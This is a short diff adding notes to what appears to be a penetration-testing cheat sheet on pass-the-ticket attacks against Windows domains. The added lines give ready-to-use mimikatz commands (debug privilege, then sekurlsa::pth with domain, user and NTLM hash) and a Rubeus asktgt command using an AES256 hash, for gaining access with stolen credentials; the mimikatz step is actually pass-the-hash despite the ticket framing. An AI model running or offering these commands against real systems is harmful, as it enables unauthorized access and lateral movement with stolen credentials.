@@ -1,2 +1,10 @@
 Now we will see how to pass the ticket rather than hash from Windows system. We need TGT (Ticket granting ticket) or TGS (Service Ticket) 
 
+Option 1) mimikatz :- Once we have the ticket, run the below commands to pass the tickets and get the access in command promt. 
+          mimikatz.exe
+          mimikatz # privilege::debug
+          mimikatz # sekurlsa::pth /domain:<domain> /user:<username> /ntlm:<Hash>
+
+
+Option 2) Rubeus :- Once we have the ticket, run the below commands to pass the tickets and get the access in command promt. 
+          #Rubeus.exe  asktgt /domain:<Domain> /user:<username> /aes256:<Hash of aes 256> /nowrap
